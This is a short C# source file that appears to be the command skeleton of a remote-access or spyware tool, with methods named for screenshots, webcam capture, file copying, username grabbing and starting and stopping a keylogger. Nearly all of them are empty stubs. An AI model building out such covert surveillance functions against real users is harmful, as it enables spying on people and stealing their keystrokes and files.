using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using Domitus;

namespace Domitus
{
    public class Actions
    {
        public void Screenshot()
        {
            Domitus.Screenshot.TakeScreenshot();
        }
        public void Popup(string e)
        {
            MessageBox.Show(e);
        }

        public void WebcamPicture()
        {
            //
        }

        public void SearchDirectory(string e)
        {

        }

        public string GetDirectories()
        {
            return "e";
        }

        public void OpenTray()
        {

        }

        public void CopyFile()
        {

        }

        public void GetUsername()
        {

        }

        public void KeyLoggerStart()
        {

        }
        public void KeyLoggerStop()
        {

        }
    }
}
